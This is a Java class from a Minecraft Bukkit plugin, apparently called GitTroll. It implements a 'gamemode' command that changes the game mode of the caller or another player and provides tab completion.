package net.Lenni0451.GitTroll.command.commands.player;

import java.util.List;

import org.bukkit.GameMode;

import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;

public class Gamemode extends CommandBase {

	public Gamemode() {
		super("Gamemode", "Change the gamemode of you or another player", "<Gamemode> [Player]");
		this.addAlias("gm");
	}

	@SuppressWarnings("deprecation")
	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.isLength(1)) {
			this.execute(executor, new ArrayHelper(args.advanceToStrings(executor.getPlayer().getName())));
		} else if(args.isLength(2)) {
			CustomPlayer vic = this.parsePlayer(args.getString(1), executor);
			
			try {
				boolean set = false;
				if(args.isInteger(0)) {
					vic.getPlayer().setGameMode(GameMode.getByValue(args.getInteger(0)));
					set = true;
				} else {
					for(GameMode mode : GameMode.values()) {
						if(mode.toString().toLowerCase().startsWith(args.getString(0))) {
							vic.getPlayer().setGameMode(mode);
							set = true;
							break;
						}
					}
				}
				if(!set) throw new Exception();
				if(vic.equals(executor)) {
					executor.sendGitMessage("Your gamemode has been updated.");
				} else {
					executor.sendGitMessage("The gamemode of the player has been updated.");
				}
			} catch (Exception e) {
				executor.sendGitMessage("§cThe gamemode could not be found.");
			}
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {
		if(args.isEmpty()) {
			tabComplete.add("0");
			tabComplete.add("1");
			tabComplete.add("2");
			tabComplete.add("3");
		} else if(args.isLength(1)) {
			this.tabCompletePlayers(tabComplete);
		}
	}

}
